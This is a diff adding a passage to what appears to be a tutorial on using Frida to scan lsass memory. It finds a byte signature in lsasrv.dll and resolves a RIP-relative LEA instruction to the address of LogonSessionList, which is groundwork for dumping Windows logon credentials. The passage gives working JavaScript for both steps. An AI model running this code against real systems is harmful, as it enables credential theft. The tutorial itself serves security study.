@@ -56,3 +56,57 @@ lea rcx, [rip + 0x118061] ; LogonSessionList
 ```
 
 Note that the address itself is a %rip-relative offset (0x118061), which is determined at runtime. We're scanning memory at runtime, though, so as long as we can find the offset, we can perform some simple pointer arithmetic to find the actual address of the variable.
+
+This is where the signature comes in. When we identify this signature in memory at a given address, we can add a certain offset to it and get to that instruction. The exact process looks like this:
+
+1. Find the address where the signature appears.
+2. Add some predetermined offset to get to the instruction which dereferences *LogonSessionList*.
+3. Skip the first 3 bytes, which are the opcodes, and read the %rip offset from the latter part of the instruction.
+4. Find what RIP will be just after our target instruction, then add the offset to get the true address of *LogonSessionList*.
+
+By following these four steps, it's possible to write a function in Frida which, when provided with a pointer and an offset, will find the dereferenced address:
+
+```javascript
+function findDereferencedAddress(ptr, offset) {
+	// Given a pointer to some signature address and an offset, extract the target address from an instruction that dereferences it. 
+	// This is used to identify the location of global variables in lsass memory by finding instructions that dereference them. 
+	
+	// Calculate the offset to the target instruction.
+	var targetAddress = ptr.add(offset);
+	var targetInstruction = Instruction.parse(targetAddress);
+	
+	// Target instruction should look something like this
+	// <signature> + <offset>: lea rcx, [rip + 0x118061]
+	// We need to extract the %rip offset and resolve it into an actual address.
+	
+	// Sanity check for the lea instruction
+	if (targetInstruction.toString().includes("lea ")) {
+		// The first 3 bytes of the instruction are the opcodes, so skip those.
+		var addrSize = targetInstruction.size - 3;
+		// Extract the address being dereferenced by the LEA instruction, which is a %rip offset.
+		var ripOffsetByteArray = targetAddress.add(3).readByteArray(addrSize);
+		// Now we convert the byte array (i.e. "ef be ad de 00") to an address ("0xdeadbeef").
+		var ripOffsetInt = new Uint32Array(ripOffsetByteArray)[0];
+		var ripOffset = new NativePointer(ripOffsetInt);
+		// Finally, we need to convert the offset into an actual address.
+		// To do this, find what RIP will be just after our target instruction, then add the offset.
+		var rip = targetAddress.add(targetInstruction.size);
+		var target = rip.add(ripOffset);
+		return target;
+	}
+}
+```
+
+Using this function, we can update our memory scanner from before to find the LogonSessionList variable:
+
+```javascript
+var lsasrv = Process.getModuleByName("lsasrv.dll")
+var sequence = "33 ff 41 89 37 4c 8b f3 45 85 c9 74"; //offset is 0x14
+
+Memory.scan(lsasrv.base, lsasrv.size, sequence, {
+	onMatch(signature, size) {
+		var logonSessionList = findDereferencedAddress(signature, 0x14);
+		console.log("LogonSessionList is at " + logonSessionList);
+	}
+});
+```
